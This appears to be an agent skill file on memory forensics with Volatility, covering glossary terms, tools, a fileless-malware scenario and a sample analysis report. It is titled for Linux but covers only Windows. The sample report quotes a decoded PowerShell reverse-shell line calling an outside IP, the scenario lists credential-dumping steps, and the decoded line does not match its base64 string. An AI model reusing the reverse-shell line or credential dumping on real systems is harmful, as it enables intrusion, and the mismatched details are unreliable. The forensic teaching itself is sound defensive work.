---
name: linux-forensic-mem-analysis-volatility-analyze
description: "Linux Forensic Mem Analysis Volatility Analyze."
domain: cybersecurity
---

|
| **Memory Forensics** | Analysis of volatile memory (RAM) contents to identify running processes, network connections, and in-memory artifacts that may not exist on disk |
| **Process Hollowing** | Malware technique of creating a legitimate process in suspended state, replacing its memory with malicious code, then resuming execution |
| **Malfind** | Volatility plugin detecting injected code by identifying memory regions with executable permissions and PE headers in non-image VADs |
| **VAD (Virtual Address Descriptor)** | Windows kernel structure tracking memory regions allocated to a process; anomalies in VADs indicate injection or hollowing |
| **EPROCESS** | Windows kernel structure representing a process; rootkits unlink EPROCESS entries to hide processes from standard tools |
| **Pool Tag Scanning** | Memory forensics technique scanning for kernel object pool tags to find objects (processes, files, connections) even when unlinked |
| **Fileless Malware** | Malware that operates entirely in memory without creating files on disk; only detectable through memory forensics |

## Tools & Systems

- **Volatility 3**: Open-source memory forensics framework supporting Windows, Linux, and macOS memory analysis with plugin architecture
- **WinPmem**: Memory acquisition tool for Windows systems that creates raw memory dumps for offline analysis
- **LiME (Linux Memory Extractor)**: Loadable kernel module for capturing Linux system memory dumps
- **Rekall**: Alternative memory forensics framework with some unique analysis capabilities (discontinued but still useful)
- **MemProcFS**: Memory process file system allowing mounting memory dumps as file systems for intuitive analysis

## Common Scenarios

### Scenario: Detecting Fileless Malware After EDR Alert

**Context**: EDR detected suspicious PowerShell activity but the threat actor cleaned up disk artifacts. A memory dump was captured before the system was rebooted. The analysis needs to identify the malware, its persistence mechanism, and any lateral movement.

**Approach**:
1. Run `windows.pstree` to identify the process chain (which process spawned PowerShell)
2. Run `windows.malfind` to detect injected code in running processes
3. Dump the suspicious process memory and extract strings for C2 URLs
4. Run `windows.netscan` to identify network connections from the compromised processes
5. Run `windows.cmdline` to see what commands PowerShell executed
6. Scan with YARA rules for known malware families in the dumped process memory
7. Extract credentials with `hashdump` and `lsadump` to assess lateral movement risk

**Pitfalls**:
- Using the wrong symbol tables for the OS version (causes plugin failures or incorrect results)
- Not comparing `pslist` vs `psscan` output (missing rootkit-hidden processes)
- Ignoring legitimate processes that have been injected into (focus on malfind results, not just process names)
- Not extracting full process memory before concluding analysis (strings from process dump may reveal additional IOCs)

## Output Format

```
MEMORY FORENSICS ANALYSIS REPORT
===================================
Dump File:        memory.dmp
Dump Size:        16 GB
OS Version:       Windows 10 21H2 (Build 19044)
Capture Tool:     WinPmem 4.0
Capture Time:     2025-09-15 14:35:00 UTC

SUSPICIOUS PROCESSES
PID   PPID  Name              Path                                    Anomaly
2184  1052  svchost.exe       C:\Users\Admin\AppData\Temp\svchost.exe Wrong path
4012  2184  powershell.exe    C:\Windows\System32\powershell.exe      Child of fake svchost
3456  4012  cmd.exe           C:\Windows\System32\cmd.exe             Spawned by PowerShell

CODE INJECTION DETECTED (malfind)
PID 852 (explorer.exe):
  Address: 0x00400000  Size: 98304  Protection: PAGE_EXECUTE_READWRITE
  Header: MZ (embedded PE detected)
  SHA-256 of dump: abc123def456...

NETWORK CONNECTIONS
PID   Process         Local           Foreign              State
2184  svchost.exe     10.1.5.42:49152 185.220.101.42:443   ESTABLISHED
4012  powershell.exe  10.1.5.42:49200 91.215.85.17:8080    ESTABLISHED

EXTRACTED CREDENTIALS
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

COMMAND LINE HISTORY
PID 4012: powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==
  Decoded: $client = New-Object System.Net.Sockets.TCPClient("185.220.101.42",443)

YARA MATCHES
PID 2184: rule CobaltStrike_Beacon { matched at 0x00401200 }

TIMELINE
14:10:00  svchost.exe (PID 2184) created from C:\Users\Admin\AppData\Temp\
14:10:05  Network connection to 185.220.101.42:443 established
14:12:30  powershell.exe (PID 4012) spawned by svchost.exe
14:15:00  Code injection into explorer.exe (PID 852) detected
14:20:00  Credential dump from LSASS process
```
